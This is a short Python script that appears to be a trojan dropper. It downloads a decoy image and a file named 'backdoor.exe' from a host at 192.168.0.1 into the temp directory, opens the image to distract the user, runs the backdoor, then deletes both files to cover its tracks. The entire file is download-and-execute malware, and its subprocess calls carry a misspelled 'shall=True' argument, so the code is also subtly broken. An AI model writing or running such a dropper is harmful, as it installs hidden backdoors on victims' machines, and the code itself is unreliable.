#!/usr/bin/env python
import requests, subprocess, os, tempfile


def download(url):
    get_request = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_request.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download(r"http://192.168.0.1/car.jpg")
subprocess.Popen("car.jpg", shall=True)

download(r"http://192.168.0.1/backdoor.exe")
subprocess.call("backdoor.exe", shall=True)

os.remove("car.jpg")
os.remove("backdoor.exe")